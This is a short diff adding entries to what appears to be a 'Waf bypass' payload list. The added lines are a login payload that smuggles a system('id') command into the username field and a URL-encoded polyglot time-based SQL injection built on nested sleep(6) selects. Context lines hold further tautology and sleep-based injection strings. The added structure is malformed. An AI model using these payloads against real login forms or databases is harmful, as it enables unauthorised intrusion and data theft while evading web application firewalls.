@@ -179,4 +179,14 @@ Waf bypass
 ' OR IF(1=1,sleep(5),0)--
 ' OR 0x31=0x31
 
+login time 
+
+"auth": (
+"user"; "darkshadow' system("id").**,
+"password" ="darkshadow"
+
+parameter = time based 
+
+select(0)from(select(sleep(6)))v)/*'%2B(select(0)from(select(sleep(6)))v)%2B%5C"%2B(select(0)from(select(sleep(6)))v)
+
 
